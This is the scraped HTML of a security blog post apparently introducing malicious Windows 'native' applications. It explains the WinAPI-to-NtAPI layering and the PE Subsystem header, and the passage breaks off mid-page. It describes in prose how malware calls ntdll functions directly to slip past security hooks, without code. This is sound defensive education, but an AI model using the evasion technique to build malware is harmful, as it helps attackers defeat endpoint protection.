# https://www.protexity.com/post/going-native-malicious-native-applications

<!DOCTYPE html><html lang="en" style="scroll-padding-top: 83px;">
<body class="" style="--scrollbar-width: 15px;">








    <!--pageHtmlEmbeds.bodyStart start-->
    
    
        <!-- VISA Session Recording Code --><!-- VISA Session Recording Code -->
    
    
    <!--pageHtmlEmbeds.bodyStart end-->















    <!-- domStoreHtml -->
    <svg data-dom-store="" style="display:none"><defs id="dom-store-defs"></defs></svg>
    

<div id="SITE_CONTAINER"><div id="main_MF" class="main_MF"><div id="SCROLL_TO_TOP" class="Vd6aQZ ignore-focus SCROLL_TO_TOP" role="region" tabindex="-1" aria-label="top of page"><span class="mHZSwn">top of page</span></div><div id="BACKGROUND_GROUP" class="backgroundGroup_qq8jc BACKGROUND_GROUP"><div id="BACKGROUND_GROUP_TRANSITION_GROUP"><div id="pageBackground_qq8jc" data-media-height-override-type="" data-media-position-override="false" class="pageBackground_qq8jc BmZ5pC"><div id="bgLayers_pageBackground_qq8jc" data-hook="bgLayers" data-motion-part="BG_LAYER pageBackground_qq8jc" class="MW5IWV"><div data-testid="colorUnderlay" class="LWbAav Kv1aVt"></div><div id="bgMedia_pageBackground_qq8jc" data-motion-part="BG_MEDIA pageBackground_qq8jc" class="VgO9Yg"></div><div data-testid="bgOverlay" class="m4khSP"></div></div></div></div></div><div id="site-root" class="site-root"><div id="masterPage" class="mesh-layout masterPage css-editing-scope"><main id="PAGES_CONTAINER" class="PAGES_CONTAINER" tabindex="-1" data-main-content="true"><div id="SITE_PAGES" class="JsJXaX SITE_PAGES"><div id="SITE_PAGES_TRANSITION_GROUP" class="AnQkDU"><div id="qq8jc" class="dBAkHi theme-vars qq8jc"><div class="PFkO7r wixui-page" data-testid="page-bg"></div><div class="HT5ybB"><div id="Containerqq8jc" class="Containerqq8jc SPY_vo"><div data-mesh-id="Containerqq8jcinlineContent" data-testid="inline-content" class=""><div data-mesh-id="Containerqq8jcinlineContent-gridContainer" data-testid="mesh-container-content"><section id="comp-lbo59jix" tabindex="-1" class="Oqnisf comp-lbo59jix wixui-section" data-block-level-container="ClassicSection"><div id="bgLayers_comp-lbo59jix" data-hook="bgLayers" data-motion-part="BG_LAYER comp-lbo59jix" class="MW5IWV"><div data-testid="colorUnderlay" class="LWbAav Kv1aVt"></div><div id="bgMedia_comp-lbo59jix" data-motion-part="BG_MEDIA comp-lbo59jix" class="VgO9Yg"></div></div><div data-mesh-id="comp-lbo59jixinlineContent" data-testid="inline-content" class=""><div data-mesh-id="comp-lbo59jixinlineContent-gridContainer" data-testid="mesh-container-content"><section id="comp-kkc8doj9" class="comp-kkc8doj9 CohWsy wixui-column-strip"><div id="bgLayers_comp-kkc8doj9" data-hook="bgLayers" data-motion-part="BG_LAYER comp-kkc8doj9" class="if7Vw2"><div data-testid="colorUnderlay" class="tcElKx i1tH8h"></div><div id="bgMedia_comp-kkc8doj9" data-motion-part="BG_MEDIA comp-kkc8doj9" class="wG8dni"></div></div><div data-testid="columns" class="V5AUxf"><div id="comp-kkc8domd" class="comp-kkc8domd YzqVVZ wixui-column-strip__column"><div id="bgLayers_comp-kkc8domd" data-hook="bgLayers" data-motion-part="BG_LAYER comp-kkc8domd" class="MW5IWV"><div data-testid="colorUnderlay" class="LWbAav Kv1aVt"></div><div id="bgMedia_comp-kkc8domd" data-motion-part="BG_MEDIA comp-kkc8domd" class="VgO9Yg"></div></div><div data-mesh-id="comp-kkc8domdinlineContent" data-testid="inline-content" class=""><div data-mesh-id="comp-kkc8domdinlineContent-gridContainer" data-testid="mesh-container-content"></div></div></div></div></section><div id="TPAMultiSection_kkb6hx4p" class="TWFxr5  TPAMultiSection_kkb6hx4p"><div class="TPAMultiSection_kkb6hx4p"><div style="--wix-color-29:var(--wix-color-3);--wix-color-37:var(--wix-color-5);--wix-color-38:var(--wix-color-8);--wix-color-39:var(--wix-color-8);--wix-color-40:var(--wix-color-1);--wix-color-41:var(--wix-color-8);--wix-color-42:var(--wix-color-8);--wix-color-43:var(--wix-color-1);--wix-color-44:var(--wix-color-3);--wix-color-45:var(--wix-color-3);--wix-color-46:var(--wix-color-1);--wix-color-47:var(--wix-color-1);--wix-color-48:var(--wix-color-8);--wix-color-49:var(--wix-color-8);--wix-color-50:var(--wix-color-1);--wix-color-51:var(--wix-color-8);--wix-color-52:var(--wix-color-8);--wix-color-53:var(--wix-color-1);--wix-color-54:var(--wix-color-3);--wix-color-55:var(--wix-color-3)" data-hook="tpa-components-provider"><div><div style="--root-width:980px" class="md lt-lg lt-xl gt-xs gt-s gt-sm gt-740 gt-830 gt-886 gt-940 w686-980 lte-w980 lte-banner-w1564 lte-banner-w1425 lte-banner-w1181 lte-banner-w980 lte-category-header-w1364  urT2WH" data-hook="post-page-root"><div class=""><div id="TPAMultiSection_kkb6hx4p.above-header" data-hook="slot-placeholder-TPAMultiSection_kkb6hx4p.above-header" class=""></div></div><div class="L5x0Fp xZVb1s is-desktop app-desktop"><div class="qi0cF2 message" data-hook="message"></div><div class="WmZAIu" id="new-blog-popover-root"></div><div id="content-wrapper"><div class="ZL4A4N" data-hook="post-page"><div class=""><div id="TPAMultiSection_kkb6hx4p.above-content-1" data-hook="slot-placeholder-TPAMultiSection_kkb6hx4p.above-content-1" class=""></div></div><div class=""><div id="TPAMultiSection_kkb6hx4p.above-content-2" data-hook="slot-placeholder-TPAMultiSection_kkb6hx4p.above-content-2" class=""></div></div><div class="HcBlwg"><div class="zp8IQu"><div><div class="EcwjNF"><article class="tgMH9T" data-hook="post"><section class="UYw9XC" data-hook="post-hero-image"></section><div class="HW6ttf"><section class="VQDdIN" data-hook="post-description"><div class="moHCnT"><div class="moHCnT"><div class="fTEXDR" data-rce-version="10.161.1"><div class="keIqh" dir="ltr" style="--ricos-text-color:rgb(var(--textParagraphColor-rgb));--ricos-text-color-tuple:var(--textParagraphColor-rgb);--ricos-action-color:rgb(var(--postButtonBackgroundColor));--ricos-action-color-tuple:var(--postButtonBackgroundColor);--ricos-background-color:rgb(var(--postBackgroundColor));--ricos-background-color-tuple:var(--postBackgroundColor);--ricos-fallback-color:rgb(0, 0, 0);--ricos-fallback-color-tuple:0, 0, 0;--ricos-settings-action-color:rgb(0, 0, 0);--ricos-settings-action-color-tuple:0, 0, 0;--ricos-text-on-action-color:rgb(var(--postButtonTextColor));--ricos-text-on-action-color-tuple:var(--postButtonTextColor);--ricos-action-color-fallback:rgb(0, 0, 0);--ricos-action-color-fallback-tuple:0, 0, 0;--ricos-custom-p-font-weight:var(--textParagraphFont-weight);--ricos-custom-p-font-style:var(--textParagraphFont-style);--ricos-custom-p-line-height:max(calc(var(--textParagraphFont-size) * 1.5), var(--textParagraphFont-line-height));--ricos-custom-p-font-size:var(--textParagraphFont-size);--ricos-custom-p-font-family:var(--textParagraphFont-family);--ricos-custom-p-text-decoration:var(--textParagraphFont-text-decoration);--ricos-custom-p-color:rgb(var(--textParagraphColor));--ricos-custom-h1-font-weight:var(--textH1Font-weight);--ricos-custom-h1-font-style:var(--textH1Font-style);--ricos-custom-h1-line-height:var(--textH1Font-line-height);--ricos-custom-h1-font-size:var(--textH1Font-size);--ricos-custom-h1-font-family:var(--textH1Font-family);--ricos-custom-h1-text-decoration:var(--textH1Font-text-decoration);--ricos-custom-h1-color:rgb(var(--textH1Color));--ricos-custom-h2-font-weight:var(--textH2Font-weight);--ricos-custom-h2-font-style:var(--textH2Font-style);--ricos-custom-h2-line-height:var(--textH2Font-line-height);--ricos-custom-h2-font-size:var(--textH2Font-size);--ricos-custom-h2-font-family:var(--textH2Font-family);--ricos-custom-h2-text-decoration:var(--textH2Font-text-decoration);--ricos-custom-h2-color:rgb(var(--textH2Color));--ricos-custom-h3-font-weight:var(--textH3Font-weight);--ricos-custom-h3-font-style:var(--textH3Font-style);--ricos-custom-h3-line-height:var(--textH3Font-line-height);--ricos-custom-h3-font-size:var(--textH3Font-size);--ricos-custom-h3-font-family:var(--textH3Font-family);--ricos-custom-h3-text-decoration:var(--textH3Font-text-decoration);--ricos-custom-h3-color:rgb(var(--textH3Color));--ricos-custom-h4-font-weight:var(--textH4Font-weight);--ricos-custom-h4-font-style:var(--textH4Font-style);--ricos-custom-h4-line-height:var(--textH4Font-line-height);--ricos-custom-h4-font-size:var(--textH4Font-size);--ricos-custom-h4-font-family:var(--textH4Font-family);--ricos-custom-h4-text-decoration:var(--textH4Font-text-decoration);--ricos-custom-h4-color:rgb(var(--textH4Color));--ricos-custom-h5-font-weight:var(--textH5Font-weight);--ricos-custom-h5-font-style:var(--textH5Font-style);--ricos-custom-h5-line-height:var(--textH5Font-line-height);--ricos-custom-h5-font-size:var(--textH5Font-size);--ricos-custom-h5-font-family:var(--textH5Font-family);--ricos-custom-h5-text-decoration:var(--textH5Font-text-decoration);--ricos-custom-h5-color:rgb(var(--textH5Color));--ricos-custom-h6-font-weight:var(--textH6Font-weight);--ricos-custom-h6-font-style:var(--textH6Font-style);--ricos-custom-h6-line-height:var(--textH6Font-line-height);--ricos-custom-h6-font-size:var(--textH6Font-size);--ricos-custom-h6-font-family:var(--textH6Font-family);--ricos-custom-h6-text-decoration:var(--textH6Font-text-decoration);--ricos-custom-h6-color:rgb(var(--textH6Color));--ricos-custom-quote-line-height:var(--textQuoteFont-line-height);--ricos-custom-quote-font-size:var(--textQuoteFont-size);--ricos-custom-quote-font-style:var(--textQuoteFont-style);--ricos-custom-quote-font-family:var(--textQuoteFont-family);--ricos-custom-quote-font-weight:var(--textQuoteFont-weight);--ricos-custom-quote-text-decoration:var(--textQuoteFont-text-decoration);--ricos-custom-quote-color:rgb(var(--textQuoteColor));--ricos-custom-quote-border-color:rgb(var(--textLinksAndHashtagsColor));--ricos-custom-quote-margin-inline-start:var(--ricosQuoteMarginInlineStart);--ricos-custom-code-block-line-height:1.5;--ricos-custom-link-font-style:inherit;--ricos-custom-link-font-weight:inherit;--ricos-custom-link-text-decoration:inherit;--ricos-custom-link-color:rgb(var(--textLinksAndHashtagsColor));--ricos-custom-hashtag-font-style:inherit;--ricos-custom-hashtag-font-weight:inherit;--ricos-custom-hashtag-text-decoration:inherit;--ricos-custom-hashtag-color:rgb(var(--textLinksAndHashtagsColor));--ricos-custom-footer-toolbar-padding-inline-start:var(--ricosFooterPadding);--ricos-custom-footer-toolbar-padding-inline-end:var(--ricosFooterPadding);--ricos-custom-editor-add-plugin-button-position-inline-start:var(--ricosAddPluginButtonStart);--ricos-breakout-normal-padding-start:var(--ricosNormalPadding);--ricos-breakout-normal-padding-end:var(--ricosNormalPadding);--ricos-breakout-full-width-padding-start:var(--ricosFullWidthPadding);--ricos-breakout-full-width-padding-end:var(--ricosFullWidthPadding)" data-id="content-viewer"><div class="mU3tk"><div type="first" data-hook="rcv-block-first"></div><div class="_0-aF-"><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" style="line-height:max(0.8em, 1.38em)" dir="auto" id="viewer-foo"><span class="vMus0"><strong style="font-weight:700"><span style="font-size:24px"><span style="color:#fd6262;text-decoration:inherit"><span>Part I: Introduction</span></span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block1"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" style="line-height:max(0.8em, 1.38em)" dir="auto" id="viewer-11uz677"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block2"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ev0qm"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block3"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" style="line-height:max(0.8em, 1.38em)" dir="auto" id="viewer-13qop"><span class="vMus0"><strong style="font-weight:700"><span style="font-size:18px"><span style="color:#fd6262;text-decoration:inherit"><span>Windows Applications</span></span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block4"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-18olz2445"><span class="vMus0"><span>Windows applications normally perform operations by interacting with the Windows Application Program Interface (WinAPI). The WinAPI then performs some processing of parameters to normalize them or calculate additional parameters that eventually get passed into the Native API (NtAPI). User mode malware can find the address of NtAPI functions at runtime by walking the exports of ntdll.dll and directly referencing NtAPI functions like NtCreateProcessEx. Because NtAPI is the lowest interaction possible in the Windows Operating system before transitioning to kernel space, directly interacting with NtAPI can have interesting results. By accessing the NtAPI malicious operators have significantly more flexibility when crafting malicious inputs, bypass hooks and checks on WinAPI functions, and thereby develop some of the </span><a target="_blank" href="https://github.com/hasherezade/process_ghosting/blob/9afd230c88ad646c0ea2dbcca3aaa11b1d30719a/main.cpp#L114" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#fd6262;text-decoration:inherit"><span>interesting techniques</span></span></a><span>&nbsp;we’ve seen in recent years that can bypass some end user protections, at least for some time (1).. </span></span></p></div><div type="paragraph" data-hook="rcv-block5"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-54ncl"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block6"></div><div data-breakout="normal"><div class="_1jXPn" dir="auto" id="viewer-6vvj6"><blockquote class="goqeH"><span><div class="Z7lok X7MWW" dir="auto" id="viewer-4f2a990008"><span class="vMus0"><em style="font-style:italic"><span style="font-size:16px"><span style="color:#FD6262;text-decoration:inherit"><span>“</span></span></span></em><span style="font-size:16px"><span style="color:#fd6262;text-decoration:inherit"><span>By removing the Windows API layer and Windows Subsystem dll dependencies we can improve the raw performance of our application. This benefit is marginal, but if you’re seeking to exploit race conditions or perform a large number of operations this benefit may interest you.</span></span></span><em style="font-style:italic"><span style="font-size:16px"><span style="color:#FD6262;text-decoration:inherit"><span>”</span></span></span></em></span></div></span></blockquote></div></div><div type="blockquote" data-hook="rcv-block7"></div><div data-hook="gap-spacer" class="ECDHM"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-un8c31206"><div class="J9Vi9 _0Vdej"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:320;--dim-width:350;--ricos-image-default-border-color:unset" id="un8c31206" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-un8c31206"><wow-image id="0628ff_c9c1e8714d3c44f2bd0a00d339b45bbf~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;un8c31206&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:350,&quot;height&quot;:320,&quot;uri&quot;:&quot;0628ff_c9c1e8714d3c44f2bd0a00d339b45bbf~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG un8c31206" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true" data-transitioned=""><img src="https://static.wixstatic.com/media/0628ff_c9c1e8714d3c44f2bd0a00d339b45bbf~mv2.webp/v1/fill/w_350,h_320,al_c,q_80,enc_avif,quality_auto/0628ff_c9c1e8714d3c44f2bd0a00d339b45bbf~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_c9c1e8714d3c44f2bd0a00d339b45bbf~mv2.webp/v1/fill/w_490,h_448,al_c,lg_1,q_80/0628ff_c9c1e8714d3c44f2bd0a00d339b45bbf~mv2.webp" draggable="false" data-ssr-src-done="true" fetchpriority="high"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block8"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" style="line-height:max(0.8em, 1.38em)" dir="auto" id="viewer-6rasr"><span class="vMus0"><span style="font-size:14px"><span>Figure 1 - Simplified Windows system architecture</span></span></span></p></div><div type="paragraph" data-hook="rcv-block9"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-5ls8t"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block10"></div><div data-breakout="normal"><h2 class="JP1W3 nAEMg Z7lok X7MWW" style="line-height:max(0.8em, 1.38em)" dir="auto" id="viewer-fcr8d"><span class="-pTyw"><strong style="font-weight:700"><span style="font-size:18px"><span style="color:#fd6262;text-decoration:inherit"><span>What Are Subsystems?</span></span></span></strong></span></h2></div><div type="heading" data-hook="rcv-block11"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-1gq0h7128"><span class="vMus0"><span>Typically, when compiling a normal C/C++ program with the MSVC compiler, an option is passed to declare the program as a GUI or Console program with the “/Subsystem” option. This declaration is saved in the compiled binary’s Optional Header, and we can look at this header entry using a parser like CFF Explorer:</span></span></p></div><div type="paragraph" data-hook="rcv-block12"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-4hho323677"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block13"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-syt0e1326"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:275;--dim-width:740;--ricos-image-default-border-color:unset" id="syt0e1326" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-syt0e1326"><wow-image id="0628ff_eae9d95dbddd4735a16e3cd15d27e0cf~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;syt0e1326&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:275,&quot;uri&quot;:&quot;0628ff_eae9d95dbddd4735a16e3cd15d27e0cf~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG syt0e1326" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true" data-transitioned=""><img src="https://static.wixstatic.com/media/0628ff_eae9d95dbddd4735a16e3cd15d27e0cf~mv2.webp/v1/fill/w_740,h_275,al_c,q_80,enc_avif,quality_auto/0628ff_eae9d95dbddd4735a16e3cd15d27e0cf~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_eae9d95dbddd4735a16e3cd15d27e0cf~mv2.webp/v1/fill/w_888,h_330,al_c,lg_1,q_80/0628ff_eae9d95dbddd4735a16e3cd15d27e0cf~mv2.webp" draggable="false" data-ssr-src-done="true" fetchpriority="high"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block14"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-xxc451338"><span class="vMus0"><span style="font-size:14px"><span>Figure 2 - (Left) Charmap.exe is a GUI application    (Right) Find.exe is a console application</span></span></span></p></div><div type="paragraph" data-hook="rcv-block15"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-wczlp4671"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block16"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ember5254"><span class="vMus0"><span>This header entry is in some ways a remnant of historical Windows functionality: support for Windows, POSIX, and OS2 applications (2, 3). While the Subsystem entry might confuse you into thinking that GUI and Console applications operate on two different subsystems, they both interface with the Windows Subsystem and that results in similar dll dependencies like the familiar KERNEL32.DLL and KERNELBASE.DLL that we expect to see in Windows applications.</span></span></p></div><div type="paragraph" data-hook="rcv-block17"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-bp0u410439"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block18"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-2kq8410075"><span class="vMus0"><span>Earlier versions of Windows supported other .dlls that allowed for POSIX and OS2 applications to function on the Windows operating system, but modern Windows systems only provide support for operations happening through the Windows Subsystem proper.</span></span></p></div><div type="paragraph" data-hook="rcv-block19"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-fvutc10077"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block20"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-l34q61035351"><span class="vMus0"><span>However, even when Windows supported OS2 and POSIX applications, the last user mode interface that those subsystems’ dlls interacted with was the same NtAPI accessible through NTDLL.DLL.</span></span></p></div><div type="paragraph" data-hook="rcv-block21"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-7n51710274"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block22"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-v9og210079"><span class="vMus0"><span>To put it another way, the diagram we saw earlier could be modified to represent the operational environment of modern applications more accurately like it is below:</span></span></p></div><div type="paragraph" data-hook="rcv-block23"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ywc4f25558"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block24"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-tpe721394"><div class="J9Vi9 _0Vdej"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:263;--dim-width:350;--ricos-image-default-border-color:unset" id="tpe721394" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-tpe721394"><wow-image id="0628ff_e4c51d0ff24a4790b495c2c3d412ea65~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;tpe721394&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:350,&quot;height&quot;:263,&quot;uri&quot;:&quot;0628ff_e4c51d0ff24a4790b495c2c3d412ea65~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG tpe721394" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true" data-transitioned=""><img src="https://static.wixstatic.com/media/0628ff_e4c51d0ff24a4790b495c2c3d412ea65~mv2.webp/v1/fill/w_350,h_263,al_c,q_80,enc_avif,quality_auto/0628ff_e4c51d0ff24a4790b495c2c3d412ea65~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_e4c51d0ff24a4790b495c2c3d412ea65~mv2.webp/v1/fill/w_490,h_368,al_c,lg_1,q_80/0628ff_e4c51d0ff24a4790b495c2c3d412ea65~mv2.webp" draggable="false" data-ssr-src-done="true" fetchpriority="high"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block25"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-1x6741411"><span class="vMus0"><span style="font-size:14px"><span>Figure 3 - A simplified architecture overview of subsystem interactions</span></span></span></p></div><div type="paragraph" data-hook="rcv-block26"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-5mrs912264"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block27"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-f059212410"><span class="vMus0"><span>And so, it’s through the NtAPI and the “Native” subsystem option that we can produce Native Applications that do not interface with the Windows Subsystem:</span></span></p></div><div type="paragraph" data-hook="rcv-block28"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-zoo7e27167"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block29"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-bs6ny76595"><div class="J9Vi9 mL-Fz"><figure class="OPDJf" data-hook="figure-IMAGE"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:790;--dim-width:959;--ricos-image-default-border-color:unset" id="bs6ny76595" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-bs6ny76595"><wow-image id="0628ff_97efaba8d5f64e4d88a651d4ce56384c~mv2.png" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;bs6ny76595&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:959,&quot;height&quot;:790,&quot;uri&quot;:&quot;0628ff_97efaba8d5f64e4d88a651d4ce56384c~mv2.png&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG bs6ny76595" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_97efaba8d5f64e4d88a651d4ce56384c~mv2.png/v1/fill/w_48,h_40,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_97efaba8d5f64e4d88a651d4ce56384c~mv2.png" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_97efaba8d5f64e4d88a651d4ce56384c~mv2.png/v1/fill/w_959,h_790,al_c,q_90/0628ff_97efaba8d5f64e4d88a651d4ce56384c~mv2.png" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 